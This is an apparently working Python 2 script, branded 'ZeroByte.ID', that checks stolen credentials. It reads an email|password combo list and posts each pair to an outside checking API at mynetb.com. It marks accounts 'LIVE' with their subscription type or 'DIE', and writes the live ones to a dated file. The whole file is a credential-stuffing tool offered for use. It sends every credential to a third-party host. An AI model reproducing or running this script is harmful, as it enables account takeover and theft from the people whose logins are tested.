#!/usr/bin/python
import requests
import json
import time
import datetime
import sys
import termcolor
class warna:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	GREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
w 		= warna.HEADER + " _   ___                  _   _     \n" + warna.ENDC
gans 	= warna.HEADER + "| | / (_)                | | | |    \n" + warna.ENDC
sangat 	= warna.HEADER + "| |/ / _ _ __ _ __   __ _| |_| |__  \n" + warna.ENDC
kirnath = warna.HEADER + "|    \| | '__| '_ \ / _` | __| '_ \ \n" + warna.ENDC
coded 	= warna.HEADER + "| |\  \ | |  | | | | (_| | |_| | | |\n" + warna.ENDC
me 		= warna.HEADER + "\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n" + warna.ENDC
exit = "[========]"
for l in w:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.01)
for l in gans:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.01)
for l in sangat:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.01)
for l in coded:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.01)
for l in me:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.01)
print warna.BOLD + warna.WARNING + "                       ZeroByte.ID\n" + warna.ENDC + warna.ENDC
openfile = str(raw_input("List?: "))
buka = open(openfile, 'r')
for line in buka:
	data 	 = line.split("|")
	email 	 = str(data[0])
	password = str(data[1]).rstrip()
	r = requests.post('http://mynetb.com/api/spot.php', data={
															'email': email,
															'password': password,
		})
	output = json.loads(r.text)
	if output['status'] == 'success':
		live = "[LIVE] {}|{}| Subscription: {}".format(email,password,output['subscription'])
		print warna.GREEN + "[LIVE] ", email,"|",password,"| Subscription :",output['subscription'] + warna.ENDC
		tanggal = datetime.datetime.today().strftime('%Y-%m-%d')
		file = open('Live-{}.txt'.format(tanggal), 'a')
		file.write(live+'\n')
	else:
		print warna.FAIL + "[DIE] ", email,"|",password + warna.ENDC
print "[+] Job Done!"
print "[+] File Saved as Live-{}.txt".format(tanggal)
